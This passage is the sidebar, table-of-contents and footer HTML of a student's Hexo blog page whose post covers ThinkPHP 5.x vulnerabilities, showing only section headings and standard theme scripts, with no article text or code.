is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/e1d073c2.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">Thinkphp5_x（反序列化）</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/2e50acad.html"><span class="level-item">DedeCMS-5.5.7-sp2</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="Yyyyyyxnp"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Yyyyyyxnp</p><p class="is-size-6 is-block">Student Yang</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Sichuan University</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">46</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">7</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">6</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/deng12yx" target="_blank" rel="me noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="level is-mobile" href="#Thinkphp5-x（不包含反序列化）"><span class="level-left"><span class="level-item">1</span><span class="level-item">Thinkphp5_x（不包含反序列化）</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#可能被利用的函数"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">可能被利用的函数</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#array-search"><span class="level-left"><span class="level-item">1.1.1</span><span class="level-item">array_search()</span></span></a></li><li><a class="level is-mobile" href="#in-array"><span class="level-left"><span class="level-item">1.1.2</span><span class="level-item">in_array()</span></span></a></li><li><a class="level is-mobile" href="#filter-var"><span class="level-left"><span class="level-item">1.1.3</span><span class="level-item">filter_var()</span></span></a></li><li><a class="level is-mobile" href="#class-exists"><span class="level-left"><span class="level-item">1.1.4</span><span class="level-item">class_exists()</span></span></a></li><li><a class="level is-mobile" href="#strpos"><span class="level-left"><span class="level-item">1.1.5</span><span class="level-item">strpos()</span></span></a></li><li><a class="level is-mobile" href="#escapeshellarg-和escapeshellcmd"><span class="level-left"><span class="level-item">1.1.6</span><span class="level-item">escapeshellarg()和escapeshellcmd()</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#下载安装"><span class="level-left"><span class="level-item">2</span><span class="level-item">下载安装</span></span></a><ul class="menu-list"><ul class="menu-list"><li><a class="level is-mobile" href="#composer安装"><span class="level-left"><span class="level-item">2.1.1</span><span class="level-item">composer安装</span></span></a></li></ul><li><a class="level is-mobile" href="#sql1"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">sql1</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境"><span class="level-left"><span class="level-item">2.2.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#测试代码"><span class="level-left"><span class="level-item">2.2.2</span><span class="level-item">测试代码</span></span></a></li><li><a class="level is-mobile" href="#代码分析"><span class="level-left"><span class="level-item">2.2.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#sql2"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">sql2</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-1"><span class="level-left"><span class="level-item">2.3.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#测试代码-1"><span class="level-left"><span class="level-item">2.3.2</span><span class="level-item">测试代码</span></span></a></li><li><a class="level is-mobile" href="#代码分析-1"><span class="level-left"><span class="level-item">2.3.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#sql3"><span class="level-left"><span class="level-item">2.4</span><span class="level-item">sql3</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-2"><span class="level-left"><span class="level-item">2.4.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#测试代码-2"><span class="level-left"><span class="level-item">2.4.2</span><span class="level-item">测试代码</span></span></a></li><li><a class="level is-mobile" href="#代码分析-2"><span class="level-left"><span class="level-item">2.4.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#sql4"><span class="level-left"><span class="level-item">2.5</span><span class="level-item">sql4</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-3"><span class="level-left"><span class="level-item">2.5.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#测试代码-3"><span class="level-left"><span class="level-item">2.5.2</span><span class="level-item">测试代码</span></span></a></li><li><a class="level is-mobile" href="#代码分析-3"><span class="level-left"><span class="level-item">2.5.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#sql5"><span class="level-left"><span class="level-item">2.6</span><span class="level-item">sql5</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-4"><span class="level-left"><span class="level-item">2.6.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#测试代码-4"><span class="level-left"><span class="level-item">2.6.2</span><span class="level-item">测试代码</span></span></a></li><li><a class="level is-mobile" href="#代码分析-4"><span class="level-left"><span class="level-item">2.6.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#sql6"><span class="level-left"><span class="level-item">2.7</span><span class="level-item">sql6</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-5"><span class="level-left"><span class="level-item">2.7.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#测试代码-5"><span class="level-left"><span class="level-item">2.7.2</span><span class="level-item">测试代码</span></span></a></li><li><a class="level is-mobile" href="#代码分析-5"><span class="level-left"><span class="level-item">2.7.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#文件包含7"><span class="level-left"><span class="level-item">2.8</span><span class="level-item">文件包含7</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-6"><span class="level-left"><span class="level-item">2.8.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#测试代码-6"><span class="level-left"><span class="level-item">2.8.2</span><span class="level-item">测试代码</span></span></a></li><li><a class="level is-mobile" href="#代码分析-6"><span class="level-left"><span class="level-item">2.8.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#代码执行8"><span class="level-left"><span class="level-item">2.9</span><span class="level-item">代码执行8</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-7"><span class="level-left"><span class="level-item">2.9.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#测试代码-7"><span class="level-left"><span class="level-item">2.9.2</span><span class="level-item">测试代码</span></span></a></li><li><a class="level is-mobile" href="#代码分析-7"><span class="level-left"><span class="level-item">2.9.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#代码执行9"><span class="level-left"><span class="level-item">2.10</span><span class="level-item">代码执行9</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-8"><span class="level-left"><span class="level-item">2.10.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#payload"><span class="level-left"><span class="level-item">2.10.2</span><span class="level-item">payload</span></span></a></li><li><a class="level is-mobile" href="#代码分析-8"><span class="level-left"><span class="level-item">2.10.3</span><span class="level-item">代码分析</span></span></a></li></ul></li><li><a class="level is-mobile" href="#代码执行10"><span class="level-left"><span class="level-item">2.11</span><span class="level-item">代码执行10</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#环境-9"><span class="level-left"><span class="level-item">2.11.1</span><span class="level-item">环境</span></span></a></li><li><a class="level is-mobile" href="#payload-1"><span class="level-left"><span class="level-item">2.11.2</span><span class="level-item">payload</span></span></a></li><li><a class="level is-mobile" href="#代码分析-9"><span class="level-left"><span class="level-item">2.11.3</span><span class="level-item">代码分析</span></span></a></li></ul></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://github.com/deng12yx" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Github</span></span><span class="level-right"><span class="level-item tag">github.com</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/JNDI/"><span class="level-start"><span class="level-item">JNDI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/RMI/"><span class="level-start"><span class="level-item">RMI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/ctf/"><span class="level-start"><span class="level-item">ctf</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%A4%8D%E6%9D%82%E7%BD%91%E7%BB%9C/"><span class="level-start"><span class="level-item">复杂网络</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">安全</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"><span class="level-start"><span class="level-item">数据结构</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"><span class="level-start"><span class="level-item">深度学习</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-10-05T10:08:19.343Z">2024-10-05</time></p><p class="title"><a href="/post/4a17b156.html">Hello World</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/7684f23b.html"><img src="/img/article/15.png" alt="T2I"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-09-23T06:17:27.000Z">2024-09-23</time></p><p class="title"><a href="/post/7684f23b.html">T2I</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/e4cc0182.html"><img src="/img/article/14.png" alt="Explainable_ML"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-09-23T06:15:08.000Z">2024-09-23</time></p><p class="title"><a href="/post/e4cc0182.html">Explainable_ML</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2024-08-18T02:04:22.000Z">2024-08-18</time></p><p class="title"><a href="/post/374aa791.html">leetcode-daily-practice</a></p><p class="categories"><a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></p></div></article><article class="media"><figure class="media-left"><a class="image" href="/post/cda691ed.html"><img src="/img/article/13.png" alt="FGSM &amp; PDG"></a></figure><div class="media-content"><p class="date"><time dateTime="2024-07-02T08:20:29.000Z">2024-07-02</time></p><p class="title"><a href="/post/cda691ed.html">FGSM &amp; PDG</a></p><p class="categories"><a href="/categories/%E5%AE%89%E5%85%A8/">安全</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2024/10/"><span class="level-start"><span class="level-item">October 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/09/"><span class="level-start"><span class="level-item">September 2024</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/08/"><span class="level-start"><span class="level-item">August 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/07/"><span class="level-start"><span class="level-item">July 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/06/"><span class="level-start"><span class="level-item">June 2024</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/03/"><span class="level-start"><span class="level-item">March 2024</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2024/02/"><span class="level-start"><span class="level-item">February 2024</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/12/"><span class="level-start"><span class="level-item">December 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/09/"><span class="level-start"><span class="level-item">September 2023</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/08/"><span class="level-start"><span class="level-item">August 2023</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/07/"><span class="level-start"><span class="level-item">July 2023</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/c/"><span class="tag">c++</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">20</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">BeautyFlower</a><p class="is-size-7"><span>&copy; 2024 yyyyyyxnp</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a><br><span id="busuanzi_container_site_uv">Visited by <span id="busuanzi_value_site_uv">0</span> users</span></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/deng12yx"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "This website uses cookies to improve your experience.",
+          dismiss: "Got it!",
+          allow: "Allow cookies",
+          deny: "Decline",
+          link: "Learn more",
+          policy: "Cookie Policy",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
+        });</script></body></html>
